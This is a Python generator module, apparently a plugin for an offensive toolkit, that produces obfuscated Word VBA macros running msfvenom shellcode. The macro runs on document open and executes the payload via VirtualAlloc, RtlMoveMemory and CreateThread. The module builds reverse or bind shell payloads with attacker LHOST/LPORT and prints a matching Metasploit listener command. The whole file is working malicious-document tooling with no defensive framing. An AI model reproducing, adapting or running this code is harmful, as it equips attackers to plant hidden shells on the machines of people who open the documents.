import subprocess
import re
import shutil
from colorama import Fore, Style

metadata = {
    "name": "MetasploitShellcodeRunnerObf",
    "description": "Obfuscated VBA macro that runs msfvenom shellcode using Windows API.",
    "parameters": ["payload", "lhost", "lport"]
}

def _extract_payload_block(s):
    match = re.search(r"(buf\s*=\s*Array\([^\)]+\)(?:\s*_\s*\n\s*[\d,\s]+)*)", s, re.MULTILINE)
    if not match:
        return None
    block = match.group(1).strip()
    return block.replace("buf", "x")


def _prompt_manual_input():
    print(Fore.YELLOW + "    Type 'EOF' on a new line to finish." + Style.RESET_ALL)
    data = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip().upper() == "EOF":
            break
        data.append(line)
    return "\n".join(data)

def generate_macro_code(params):
    p = params.get("payload")
    h = params.get("lhost", "")
    pt = params.get("lport", "")

    if not p:
        raise ValueError("Missing required parameter: --payload")

    cmd = ["msfvenom", "-p", p, "EXITFUNC=thread", "-f", "vbapplication"]

    if any(w in p.lower() for w in ["reverse", "bind"]):
        if not h:
            raise ValueError("Missing required parameter --lhost for selected payload.")
        cmd.insert(-2, f"LHOST={h}")
        if "reverse" in p.lower() and not pt:
            raise ValueError("Missing required parameter --lport for selected payload.")
        if pt:
            cmd.insert(-2, f"LPORT={pt}")

    try:
        if not shutil.which("msfvenom"):
            print(Fore.RED + "[!] msfvenom not found on this system.\n" + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Run the following command on a machine with Metasploit installed:\n")
            suggest = f"msfvenom -p {p} LHOST={h} LPORT={pt} EXITFUNC=thread -f vbapplication"
            print(Fore.YELLOW + f"    {suggest}\n")
            listener = f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {p}; set LHOST {h}; set LPORT {pt}; set ExitOnSession false; exploit -j"'
            print(Fore.GREEN + "[*] Start the Metasploit listener with:\n")
            print(Fore.YELLOW + f"    {listener}\n")
            print(Fore.CYAN + "[*] After executing it, paste the full output below.")
            shellcode_raw = _prompt_manual_input()
            shellcode_parsed = _extract_payload_block(shellcode_raw)
            if not shellcode_parsed:
                raise ValueError("Could not extract shellcode from pasted input.")
        else:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError("msfvenom failed: " + result.stderr)
            shellcode_parsed = _extract_payload_block(result.stdout)
            if not shellcode_parsed:
                raise ValueError("Could not extract shellcode from msfvenom output.")
    except Exception as e:
        return f"Error generating shellcode: {e}"

    # Obfuscated variable/function names
    return f'''
Private Declare PtrSafe Function cT Lib "KERNEL32" Alias "CreateThread" (ByVal a1 As Long, ByVal a2 As Long, ByVal a3 As LongPtr, a4 As LongPtr, ByVal a5 As Long, ByRef a6 As Long) As LongPtr
Private Declare PtrSafe Function vA Lib "KERNEL32" Alias "VirtualAlloc" (ByVal b1 As LongPtr, ByVal b2 As Long, ByVal b3 As Long, ByVal b4 As Long) As LongPtr
Private Declare PtrSafe Function rM Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal d1 As LongPtr, ByRef d2 As Any, ByVal d3 As Long) As LongPtr

Sub AutoOpen()
    Call z
End Sub

Sub Document_Open()
    Call z
End Sub

Sub z()
    Dim x As Variant
    Dim m As LongPtr
    Dim i As Long
    Dim u As Long
    Dim r As LongPtr

    {shellcode_parsed}

    m = vA(0, UBound(x), &H3000, &H40)
    For i = LBound(x) To UBound(x)
        u = x(i)
        r = rM(m + i, u, 1)
    Next i
    r = cT(0, 0, m, 0, 0, 0)
End Sub
'''
